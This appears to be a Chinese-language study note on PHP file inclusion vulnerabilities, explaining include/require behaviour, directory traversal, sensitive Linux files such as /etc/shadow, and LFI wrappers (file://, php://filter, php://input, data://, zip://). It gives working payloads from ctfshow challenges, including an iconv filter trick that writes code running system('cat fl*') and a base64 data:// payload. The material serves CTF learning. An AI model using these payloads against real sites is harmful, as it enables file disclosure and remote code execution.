---
title: 文件包含
date: 2026-03-16 16:01:36
tags: 文件包含
---

# 文件包含

## 一.文件包含的简单介绍

### 1.1简介

和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。

包含是什么呢，文件包含是编程中的一种代码复用技术，将通用的函数或代码块写入单独文件，需要时通过特定函数引入当前文件执行。这种机制提高了代码的复用性和可维护性。

### 1.2形成的原因

当文件包含功能允许用户动态指定包含的文件路径，且服务器未进行严格过滤时，攻击者就可以通过修改文件位置来让后台执行任意文件，控制包含的文件内容，导致漏洞产生。

### 1.3常见的函数（php）

#### 1.3.1 include函数

**函数原型：**

```php
include(string $filename): mixed
```

将指定文件的内容插入到当前脚本中

文件不存在时产生警告(Warning)，脚本继续执行

每次调用都会重新包含文件

返回被包含文件的值（如果有return语句）

**执行机制**：

```
用户请求 → PHP解析 → 遇到include() → 调用Zend引擎 → 文件查找 → 文件读取 → 编译执行 → 返回结果
```

与其他常见函数区别：

在找不到被包含的文件只会产生警告，脚本会继续执行。

#### 1.3.2 require 函数

**函数原型：**

```php
require(string $filename): mixed
```

与include类似，但文件不存在时产生致命错误(E_COMPILE_ERROR)

脚本立即停止执行

常用于关键依赖文件（配置文件、核心库）

**执行机制：**

```txt
遇到require() → 文件查找 → 文件存在？→ 是→ 编译执行
                          ↓ 否
                      致命错误 → 脚本终止
```

#### 1.3.3 include_once函数

**函数原型：**

```php
include_once(string $filename): mixed
```

include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含，所以其拥有重复检查的功能。

**执行机制：**

```txt
遇到include_once() → 检查已包含文件列表 → 已存在？→ 是→ 跳过
                                      ↓ 否
                                  包含文件 → 记录到列表
```



#### 1.3.4 require_once函数

**函数原型：**

```php
require_once(string $filename): mixed
```

结合require的错误处理机制

包含include_once的重复检查功能

所占内存最大（需要检查包含历史 + 文件存在性验证）

**执行机制：**

```txt
遇到require_once() → 文件存在？→ 否→ 致命错误终止
                 ↓ 是
             查重检查 → 已存在？→ 是→ 跳过
                      ↓ 否
                  包含文件 → 记录到列表
```

### 1.4漏洞成因演示

简单示例：

创建一个 test.php,写入：

```php
<?php
	include $_GET['test'];
?>

```

创建一个phpinfo.php函数

```php
<?php
	phpinfo();
?>
```

这时候我们去利用文件包含，通过include函数执行phpinfo.php页面

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260316233248652.png" alt="image-20260316233248652" style="zoom:80%;" />

把文件名改为jpg,发现依然可以解析。

![image-20260316235611119](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260316235611119.png)

可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。

而在文件上传中，我们上传了jpg格式的一句话木马，如果有文件包含漏洞jpg文件就可以当作php文件解析，所以文件上传通常配合文件包含一起使用。

## 二.关于文件路径

### 2.1

通过文件包含漏洞我们可以读取本地的一些敏感信息

以本地靶场为例

我们创建一个php文件

```php
<?php
	$file=$_GET['filename'];
	include($file);
?>
```

利用文件包含漏洞我们可以获取系统本地的一些敏感信息

例如:`C:\Windows\system.ini`文件。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260317161151018.png" alt="image-20260317161151018" style="zoom:80%;" />

这里就涉及了相对路径和绝对路径的问题

### 2.2绝对路径与相对路径

**绝对路径：**是指从文件系统的根目录开始，完整描述文件或目录位置的一种路径表示方法。

上面的系统文件就是绝对路径

**相对路径：**是从当前目录开始，描述文件或目录位置的路径表示方法。

这里值得一提的是可以通过./表示当前目录位置，../表示上一级路径位置

通过相对路径我们可以做到访问一些关键文件。

举例：BUUCTF exer

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260317203558498.png" alt="image-20260317203558498" style="zoom:80%;" />

当我们知道根目录下有文件但是无法知晓其绝对路径时，相对路径可以通过不断返回上一级路径进行目录穿越来进行读取。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260317203848406.png" alt="image-20260317203848406" style="zoom:80%;" />

### 2.3 常见敏感目录信息

这里只展示liunx的，windows的出现很少

```
/etc/password //账户信息
/etc/shadow //账户密码信息
/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
/usr/local/app/php5/lib/php.ini //PHP相关配置
/etc/httpd/conf/httpd.conf //Apache配置文件
/etc/my.conf //mysql配置文件
```

## 三.LFI漏洞利用

### 3.1文件包含协议

#### 3.1.1 file://协议

**条件**：

allow_url_fopen：不受影响

allow_url_include：不受影响

**作用**：用于访问本地文件系统

说明：file:// 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\、\或  Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 命令行界面（CLI）  的时候，目录默认是脚本被调用时所在的目录。

在某些函数里，例如 fopen() 和 file_get_contents()， `include_path` 会可选地搜索，也作为相对的路径。

**用法：**

```
file:///etc/passwd
file://C:/Windows/win.ini
```

**示例**

file://[ 文件的绝对路径和文件名]

```
http://127.0.0.1/?filename=file:///etc/passwd
```

#### 3.1.2 php://协议

**条件**：

allow_url_fopen：不受影响

allow_url_include：仅 `php://input`、 `php://stdin`、`php://memory`、`php://temp` 需要 `on`

**作用**：  访问各个输入 / 输出流（I/O streams）

**说明**：  PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，  内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

```
php://input 	可以访问请求的原始数据的只读流。 如果在php配置中启用了 enable_post_data_reading 选项， php://input 在使用 enctype="multipart/form-data"（请求方式） 的 POST 请求中不可用，这里php://input 是一个数据流，但在PHP的文件操作函数（如include、require、file_get_contents）中，它被当作一个"虚拟文件"来处理。这也就意味着当我们进行文件包含时利用这个协议我们上传的php代码就可以被成功执行
```

```
php://output 	只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区（在php脚本完整运行过后随着其运行结果如果有的话一起从缓冲区里输出）。
```

```
php://fd 	(>=5.3.6) php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 。
文件描述符是操作系统为每个打开的文件、网络连接、管道等分配的"数字标签"
php://fd 让你可以直接通过这个数字标签来访问对应的资源
例如：php://fd/3 表示访问文件描述符3对应的资源
```

```
php://memory，php://temp 	(>=5.1.0) 类似文件 包装器的数据流，允许读写临时数据。 两者的一个区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致。php://temp 的内存限制可通过添加 /maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。（这里主要是写入数据）
```

```
php://filter 	(>=5.0.0) 元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器
```

**php://filter的参数 **

该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：

| 名称                        | 描述                                                         |
| :-------------------------- | :----------------------------------------------------------- |
| `resource=<要过滤的数据流>` | 这个参数是必须的。它指定了你要筛选过滤的数据流。             |
| `read=<读链的筛选列表>`     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。 |
| `write=<写链的筛选列表>`    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。 |
| `<；两个链的筛选列表>`      | 任何没有以 `read=` 或 `write=` 作前缀 的筛选器列表会视情况应用于读或写链。 |

**用法** ：（一下来自crfshow的各题payload）

```
# 直接读，PHP 代码会被解析（只能看见读取后的结果），主要作用（读取）
php://filter/resource=flag.php
# 针对 PHP 文件（常用）这里是读取的源码
php://filter/read=convert.base64-encode/resource=flag.php
# 其他字符编码
php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php
# Rot13
php://filter/string.rot13/resource=1.php（字符串过滤器+ROT13加密算法）
# 
php://input
[POST DATA部分]
<?php phpinfo(); ?>
```

**示例** ctfshow web117

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: yu22x
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 18:16:59

*/
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents); 
```

这里可以很明显看出来没有ban php://协议但是它只留了resource和filter，过滤了base64编码和rot13编码这里还有ucs2编码可以使用（这里去使用主要是要利用过滤器把php die变成一个无法被解析的形式。），这里注意 `ucs-2` 编码的字符串位数一定要是偶数，否则会报错，`ucs-4` 编码的字符串位数一定要是 4 的倍数，否则会报错所以我们在进行木马加密的时候需要使用通配符*来帮我们满足其偶数条件。这里我们要使用write参数去给文件写入木马（或者执行指令）然后访问。

加密payload:

```php
<?php 
echo iconv("UCS-2LE","UCS-2BE",'<?php system("cat fl*");');
```

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260318220603745.png" alt="image-20260318220603745" style="zoom:80%;" />

输出

```
?<hp pystsme"(ac tlf"*;)
```

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260318220838541.png" alt="image-20260318220838541" style="zoom:80%;" />

这是<?php die();?>会被转换的样子。也就意味着其不会被识别执行

payload:

```
GET: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php
POST: contents=?<hp pystsme"(ac tlf"*;)
```

然后访问1.php我们就能看见flag了

这里base63和rot13的思路也是一样的通过编码协议去过滤我们不想要的东西，或者是通过编码来让文件不被执行从而读取其中变量或是获取源码等等

补充：我们可以利用 `php://filter` 伪协议来读取文件内容，需要注意的是，`php://filter` 伪协议如果不指定过滤器的话，默认会解析 PHP 代码（这里其实从原理上就是include等函数最后总是会执行文件的如果没有编码就意味着它拥有完整可执行的php代码），所以我们需要指定 `convert.base64-encode` 过滤器来对文件内容进行编码

#### 3.1.3data://协议

**条件**：

allow_url_fopen：on

allow_url_include： on

**作用**：自 `PHP>=5.2.0` 起，可以使用 `data://` 数据流封装器，以传递相应格式的数据。通常可以用来执行 PHP 代码。

与前面的php://协议都是读取不同，这里的data是可以直接进行执行的（后面直接带php代码），在面对包含函数的时候这个协议会直接执行协议后带的代码。

注意使用 data:// 的时候必须开启 allow_url_include 和 allow_url_fopen 

- **用法**：

```
data://text/plain,<?php phpinfo();
data://text/plain;base64,[Base64编码后的代码]
```

示例web79

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

payload:

```php
data://test/plain,<?php system('cat flag.php');
有过滤使用编码绕过
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
```

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260318235600054.png" alt="image-20260318235600054" style="zoom:80%;" />

#### 3.1.4 ZIP://协议（由于其需要绝对路径传入所以应用不广）

**条件**：

allow_url_fopen ：off/on

allow_url_include：off/on

**作用**

**zip://** 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。

zip://中只能传入绝对路径。

要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）

只需要是zip的压缩包即可，后缀名可以任意更改。

相同的类型还有zlib://和bzip2://

**用法**

```txt
zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\1.zip%23phpinfo.txt
```

这里恶意代码被压缩，安全软件扫描时看到的是压缩数据，不是明文PHP代码，可能绕过检测。
